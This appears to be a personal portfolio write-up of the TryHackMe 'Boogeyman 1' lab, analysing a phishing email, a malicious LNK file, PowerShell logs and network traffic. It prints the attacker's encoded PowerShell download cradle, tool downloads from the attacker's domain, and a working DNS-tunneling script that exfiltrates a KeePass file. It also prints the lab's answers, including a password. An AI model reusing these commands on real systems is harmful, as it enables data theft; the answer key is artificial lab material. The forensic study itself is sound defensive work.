<!DOCTYPE html>
<html lang="en" class="scroll-smooth">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boogeyman 1 - Complete Incident Analysis | Tuned for Security</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .code-block {
            background: #1f2937;
            color: #f9fafb;
            border-radius: 0.5rem;
            padding: 1rem;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.875rem;
            margin: 1rem 0;
        }
        .highlight {
            background: #fef3c7;
            padding: 0.125rem 0.25rem;
            border-radius: 0.25rem;
        }
    </style>
</head>
<body class="bg-gray-50 text-gray-800 font-sans">

    <nav class="sticky top-0 z-50 bg-white bg-opacity-90 backdrop-filter backdrop-blur-lg shadow-md">
        <div class="container mx-auto px-6 py-4 flex justify-start items-center">
            <a href="../index.html" class="text-2xl font-bold text-gray-800 transition duration-300 hover:text-gray-600">← Back to Portfolio</a>
        </div>
    </nav>

    <main class="container mx-auto px-6 py-16">
        <article class="bg-white p-8 rounded-lg shadow-xl max-w-6xl mx-auto">
            
            <!-- Header -->
            <div class="text-center mb-12">
                <h1 class="text-4xl md:text-5xl font-extrabold text-gray-900 mb-4">Boogeyman 1 - TryHackMe Writeup</h1>
                <h2 class="text-xl md:text-2xl font-semibold text-gray-600 mb-6">Complete Incident Response Analysis</h2>
                <div class="flex flex-wrap justify-center gap-2 mb-6">
                    <span class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-semibold">Incident Response</span>
                    <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">Malware Analysis</span>
                    <span class="bg-purple-100 text-purple-800 px-3 py-1 rounded-full text-sm font-semibold">Network Forensics</span>
                    <span class="bg-red-100 text-red-800 px-3 py-1 rounded-full text-sm font-semibold">PowerShell Analysis</span>
                    <span class="bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-sm font-semibold">DNS Exfiltration</span>
                </div>
                <p class="text-gray-600">Published: September 2025 • Estimated reading time: 15 minutes</p>
            </div>

            <!-- Overview Section -->
            <div class="bg-gray-100 p-6 rounded-lg mb-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-4">Overview</h2>
                <div class="grid md:grid-cols-2 gap-6">
                    <div>
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Difficulty:</strong> Medium</li>
                            <li><strong>Skills Practiced:</strong> Email Analysis, Malware Analysis, Network Forensics, PowerShell Log Analysis</li>
                            <li><strong>Tools Used:</strong> Thunderbird, lnkparse, Wireshark, jq, tshark, xxd</li>
                            <li><strong>Time Investment:</strong> 3-4 hours</li>
                        </ul>
                    </div>
                    <div>
                        <p class="text-gray-700"><strong>Career Relevance:</strong> Essential SOC analyst skills for incident response and threat hunting. This room provides hands-on experience with a complete incident response scenario, teaching essential skills for SOC analysts including phishing analysis, malware investigation, and network forensics.</p>
                    </div>
                </div>
            </div>

            <!-- Learning Objectives -->
            <div class="mb-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-4">Learning Objectives</h2>
                <p class="text-gray-700 leading-relaxed">
                    This room provides hands-on experience with a complete incident response scenario, teaching essential skills for SOC analysts including phishing analysis, malware investigation, and network forensics. The scenario mirrors real-world attacks targeting finance departments with sophisticated social engineering and malware deployment techniques.
                </p>
            </div>

            <!-- Task 1 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 1: Room Introduction</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Understand the scenario and deployment requirements</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Approach</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Analyzed the scenario involving Quick Logistics LLC's finance team being targeted by a phishing attack. The investigation focuses on employee Julianne Westcott who received a malicious email from what appeared to be a business partner.
                </p>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    Understanding the importance of context in incident response - knowing the target, attack vector, and available artifacts before beginning analysis is crucial for effective investigation.
                </p>
            </div>

            <!-- Task 2 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 2: Email Analysis</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Analyze the phishing email and extract malicious payload</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Approach</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Used Thunderbird to analyze the email headers and structure, identifying the attack vector and payload delivery mechanism.
                </p>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Technical Steps</h4>
                <div class="code-block">
# Open email file in Thunderbird for analysis
thunderbird /home/ubuntu/Desktop/artefacts/dump.eml

# Extract attachment with provided password
unzip Invoice.zip  # password: Invoice2023!

# Analyze the LNK file payload
lnkparse Invoice_20230103.lnk
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Findings</h4>
                <ul class="list-disc list-inside space-y-2 text-gray-700 mb-4">
                    <li><strong>Sender:</strong> agriffin@bpakcaging.xyz (suspicious domain)</li>
                    <li><strong>Victim:</strong> julianne.westcott@hotmail.com</li>
                    <li><strong>Third-party relay:</strong> elasticemail.com (identified in DKIM signature)</li>
                    <li><strong>Payload:</strong> Invoice_20230103.lnk (Windows shortcut file)</li>
                    <li><strong>Encoded PowerShell command:</strong> Found in Command Line Arguments field</li>
                </ul>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">PowerShell Payload Analysis</h4>
                <p class="text-gray-700 leading-relaxed mb-2">
                    The lnkparse tool revealed a base64-encoded PowerShell command:
                </p>
                <div class="code-block">
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
                </div>

                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
                    <h4 class="font-semibold text-green-800 mb-2">Task 2 Answers</h4>
                    <ul class="space-y-1 text-green-700 text-sm">
                        <li><strong>Email address used to send phishing email:</strong> <span class="highlight">agriffin@bpakcaging.xyz</span></li>
                        <li><strong>Email address of victim:</strong> <span class="highlight">julianne.westcott@hotmail.com</span></li>
                        <li><strong>Third-party mail relay service:</strong> <span class="highlight">elasticemail</span></li>
                        <li><strong>File inside encrypted attachment:</strong> <span class="highlight">Invoice_20230103.lnk</span></li>
                        <li><strong>Password of encrypted attachment:</strong> <span class="highlight">Invoice2023!</span></li>
                        <li><strong>Encoded payload:</strong> <span class="highlight">aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==</span></li>
                    </ul>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    LNK files are common initial access vectors that can execute hidden PowerShell commands, making them effective for bypassing basic email security filters.
                </p>
            </div>

            <!-- Task 3 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 3: PowerShell Log Analysis</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Analyze PowerShell execution logs to understand the attack progression</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Approach</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Used jq to parse JSON-formatted PowerShell logs and extract unique commands to understand the attacker's methodology.
                </p>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Technical Steps</h4>
                <div class="code-block">
# Extract unique PowerShell commands from logs
cat powershell.json | jq -s 'map(.ScriptBlockText) | unique | .[]'
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Attack Timeline Analysis</h4>

                <div class="space-y-6">
                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <h5 class="font-semibold text-red-800 mb-2">1. Initial Reconnaissance</h5>
                        <div class="code-block">
whoami;pwd
cd C:\\;pwd
ls;pwd
cd Users;pwd
cd j.westcott;pwd
                        </div>
                        <p class="text-red-700">The attacker confirmed access and explored the directory structure.</p>
                    </div>

                    <div class="bg-orange-50 border-l-4 border-orange-500 p-4">
                        <h5 class="font-semibold text-orange-800 mb-2">2. Tool Download and Execution</h5>
                        <div class="code-block">
# Downloaded Seatbelt reconnaissance tool
iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd

# Executed various Seatbelt commands for system enumeration
.\sb.exe all;pwd
.\sb.exe system;pwd
.\sb.exe -group=all;pwd
.\sb.exe -group=user;pwd
                        </div>
                    </div>

                    <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4">
                        <h5 class="font-semibold text-yellow-800 mb-2">3. Data Discovery</h5>
                        <div class="code-block">
# Searched for sensitive files
ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd

# Located Sticky Notes database
ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState;pwd
                        </div>
                    </div>

                    <div class="bg-purple-50 border-l-4 border-purple-500 p-4">
                        <h5 class="font-semibold text-purple-800 mb-2">4. Database Analysis</h5>
                        <div class="code-block">
# Downloaded SQLite tool
iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd

# Queried Sticky Notes database
.\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite "SELECT * from NOTE limit 100";pwd
                        </div>
                    </div>

                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <h5 class="font-semibold text-red-800 mb-2">5. Data Exfiltration via DNS Tunneling</h5>
                        <div class="code-block">
$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx';
$destination = "167.71.211.113";
$bytes = [System.IO.File]::ReadAllBytes($file);
$hex = ($bytes|ForEach-Object ToString X2) -join '';
$split = $hex -split '(\\S{50})';
ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;}
echo "Done";
                        </div>
                    </div>
                </div>

                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
                    <h4 class="font-semibold text-green-800 mb-2">Task 3 Answers</h4>
                    <ul class="space-y-1 text-green-700 text-sm">
                        <li><strong>Domains used by attacker:</strong> <span class="highlight">cdn.bpakcaging.xyz,files.bpakcaging.xyz</span></li>
                        <li><strong>Enumeration tool downloaded:</strong> <span class="highlight">seatbelt</span></li>
                        <li><strong>File accessed by sq3.exe:</strong> <span class="highlight">C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite</span></li>
                        <li><strong>Software using the file:</strong> <span class="highlight">Microsoft Sticky Notes</span></li>
                        <li><strong>Name of exfiltrated file:</strong> <span class="highlight">protected_data.kdbx</span></li>
                        <li><strong>File type using .kdbx extension:</strong> <span class="highlight">keepass</span></li>
                        <li><strong>Encoding used during exfiltration:</strong> <span class="highlight">hex</span></li>
                        <li><strong>Tool used for exfiltration:</strong> <span class="highlight">nslookup</span></li>
                    </ul>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    DNS tunneling is a sophisticated exfiltration technique that can bypass traditional firewalls by embedding data in DNS queries.
                </p>
            </div>

            <!-- Task 4 -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Task 4: Network Traffic Analysis</h2>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
                    <h3 class="font-semibold text-blue-800 mb-2">Objective</h3>
                    <p class="text-blue-700">Analyze network traffic to understand attack communication and recover exfiltrated data</p>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Approach</h4>
                <p class="text-gray-700 leading-relaxed mb-4">
                    Used Wireshark and tshark to analyze packet capture, focusing on HTTP requests to attacker infrastructure and DNS exfiltration traffic.
                </p>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Technical Steps</h4>

                <div class="space-y-4">
                    <div>
                        <h5 class="font-semibold text-gray-700 mb-2">1. Analyzed File Downloads</h5>
                        <div class="code-block">
# Filter HTTP requests to attacker's file server
http.request.method == "GET" and http.host == "files.bpakcaging.xyz"
                        </div>
                    </div>

                    <div>
                        <h5 class="font-semibold text-gray-700 mb-2">2. Examined Server Response Headers</h5>
                        <p class="text-gray-700 mb-2">From HTTP stream analysis, identified the server software:</p>
                        <div class="code-block">
Server: SimpleHTTP/0.6 Python/3.10.7
                        </div>
                    </div>

                    <div>
                        <h5 class="font-semibold text-gray-700 mb-2">3. Reconstructed Exfiltrated Data</h5>
                        <div class="code-block">
# Extract DNS queries containing exfiltrated data
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz"

# Filter out infrastructure queries and extract hex data
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq

# Reconstruct the KeePass database file
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > extracted.txt
cat extracted.txt | xxd -r -p > reconstructed_kdbx.kdbx
                        </div>
                    </div>

                    <div>
                        <h5 class="font-semibold text-gray-700 mb-2">4. Analyzed Command Output in Traffic</h5>
                        <p class="text-gray-700 mb-2">Used Wireshark to follow TCP streams and found the Sticky Notes database query results. Converted the hex dump to ASCII to reveal:</p>
                        <div class="code-block">
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y
                        </div>
                    </div>

                    <div>
                        <h5 class="font-semibold text-gray-700 mb-2">5. Accessed Reconstructed Database</h5>
                        <p class="text-gray-700">Used the extracted password <span class="highlight">%p9^3!lL^Mz47E2GaT^y</span> to open the reconstructed KeePass database and found the stored credit card number.</p>
                    </div>
                </div>

                <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-4">
                    <h4 class="font-semibold text-green-800 mb-2">Task 4 Answers</h4>
                    <ul class="space-y-1 text-green-700 text-sm">
                        <li><strong>Software used by attacker for file/payload server:</strong> <span class="highlight">python</span></li>
                        <li><strong>HTTP method used by C2 for command output:</strong> <span class="highlight">POST</span></li>
                        <li><strong>Protocol used during exfiltration:</strong> <span class="highlight">dns</span></li>
                        <li><strong>Password of exfiltrated file:</strong> <span class="highlight">%p9^3!lL^Mz47E2GaT^y</span></li>
                        <li><strong>Credit card number in exfiltrated file:</strong> <span class="highlight">4024007128269551</span></li>
                    </ul>
                </div>

                <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Learning</h4>
                <p class="text-gray-700 leading-relaxed">
                    Network traffic analysis can reveal the complete attack chain and even allow recovery of exfiltrated data when proper forensic techniques are applied.
                </p>
            </div>

            <!-- Overall Analysis -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Overall Methodology</h2>
                <p class="text-gray-700 leading-relaxed mb-4">
                    This investigation followed a systematic approach typical of professional incident response:
                </p>
                <ol class="list-decimal list-inside space-y-2 text-gray-700 mb-6">
                    <li><strong>Email Analysis:</strong> Identified initial attack vector and payload</li>
                    <li><strong>Malware Analysis:</strong> Understood payload capabilities and execution method</li>
                    <li><strong>Log Analysis:</strong> Traced attacker activities and data access</li>
                    <li><strong>Network Forensics:</strong> Reconstructed communication and recovered stolen data</li>
                </ol>
            </div>

            <!-- Key Tools & Career Application -->
            <div class="mb-12">
                <h2 class="text-3xl font-bold text-gray-800 mb-4">Key Tools & Career Application</h2>
                
                <div class="bg-gradient-to-r from-blue-50 to-purple-50 p-6 rounded-lg mb-6">
                    <h3 class="text-xl font-bold text-gray-700 mb-3">Tools Demonstrated</h3>
                    <p class="text-gray-700 leading-relaxed">
                        <strong>Investigation:</strong> Thunderbird, lnkparse, jq, Wireshark/tshark, xxd<br>
                        <strong>Techniques:</strong> Email forensics, malware analysis, network traffic reconstruction, DNS exfiltration recovery
                    </p>
                </div>

                <div class="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-lg">
                    <h3 class="text-xl font-bold text-gray-700 mb-3">SOC Analyst Relevance</h3>
                    <p class="text-gray-700 leading-relaxed mb-4">
                        This scenario mirrors daily SOC operations including phishing investigation, malware analysis, PowerShell log investigation, network forensics, and incident documentation - core skills for threat detection and response roles.
                    </p>
                    <div class="grid md:grid-cols-2 gap-4">
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Phishing Investigation:</strong> Email analysis for identifying malicious campaigns</li>
                            <li><strong>Malware Analysis:</strong> Understanding attack vectors and payload capabilities</li>
                            <li><strong>Log Analysis:</strong> PowerShell investigation for endpoint security</li>
                        </ul>
                        <ul class="space-y-2 text-gray-700">
                            <li><strong>Network Forensics:</strong> Traffic analysis for attack progression</li>
                            <li><strong>Data Recovery:</strong> Forensic techniques for compromised information</li>
                            <li><strong>Incident Documentation:</strong> Professional reporting for technical audiences</li>
                        </ul>
                    </div>
                </div>
            </div>
                            